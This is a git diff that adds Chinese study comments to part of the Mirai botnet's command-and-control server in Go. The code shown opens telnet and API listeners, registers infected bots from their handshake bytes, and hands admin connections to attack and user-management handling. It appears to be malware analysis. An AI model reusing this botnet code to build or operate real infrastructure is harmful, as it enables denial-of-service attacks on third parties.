@@ -19,13 +19,13 @@ var clientList *ClientList = NewClientList()
 var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable) //建立本地数据库mirai
 
 func main() {
-	tel, err := net.Listen("tcp", "0.0.0.0:23") //23用来处理 telnet 登录【是招募的bot payload连接这个端口】
+	tel, err := net.Listen("tcp", "0.0.0.0:23") //23用来处理 telnet 登录【是招募的bot payload连接这个端口或者是admin用户】
 	if err != nil {
 		fmt.Println(err)
 		return
 	}
 
-	api, err := net.Listen("tcp", "0.0.0.0:101") //101用作 API 处理。【应该是作为租售服务，对外开放的API接口】
+	api, err := net.Listen("tcp", "0.0.0.0:101") //101用作 API 处理。【应该是作为租售服务，对外开放的API攻击接口】
 	if err != nil {
 		fmt.Println(err)
 		return
@@ -65,7 +65,7 @@ func initialHandler(conn net.Conn) {
 	//这一段代码应该是对应着mirai的bot/main.c的代码（292行的位置）
 	//mirai bot payload应该会先发送\x00\x00\x00\x01
 	//然后发送id_len和id_buf
-	if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
+	if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 { //如果接入23的是bot
 		if buf[3] > 0 {
 			string_len := make([]byte, 1) //读取一字节的数据，也就是说接收的字符长度不超过256
 			l, err := conn.Read(string_len)
@@ -75,7 +75,7 @@ func initialHandler(conn net.Conn) {
 			var source string
 			if string_len[0] > 0 {
 				source_buf := make([]byte, string_len[0]) //设置接收buffer的长度为string_len[0]
-				l, err := conn.Read(source_buf)           //读取string_len[0]长度的buffer数据
+				l, err := conn.Read(source_buf)           //读取string_len[0]长度的buffer数据【感觉source可能是一个本地ip】
 				if err != nil || l <= 0 {
 					return
 				}
@@ -83,11 +83,12 @@ func initialHandler(conn net.Conn) {
 			}
 			//增加bot，记录\x01和source信息（应该就是bot main函数运行时的argv[0]）
 			NewBot(conn, buf[3], source).Handle() //也就是conn记录了和bot 23端口建立的连接，buf[3]为\x01也就是version 1的bot版本。
+			//NewBot的handle就是在这个mirai server的clientList中增加招募的bot【也就是现在连接到23进行注册的bot】
 		} else {
 			NewBot(conn, buf[3], "").Handle()
 		}
-	} else {
-		NewAdmin(conn).Handle() //否则只记录conn连接，并且调用Handle函数
+	} else { //如果接入23的是admin
+		NewAdmin(conn).Handle() //否则只记录conn连接，并且调用Handle函数【处理admin的命令（攻击或者添加用户）】
 	}
 }
 
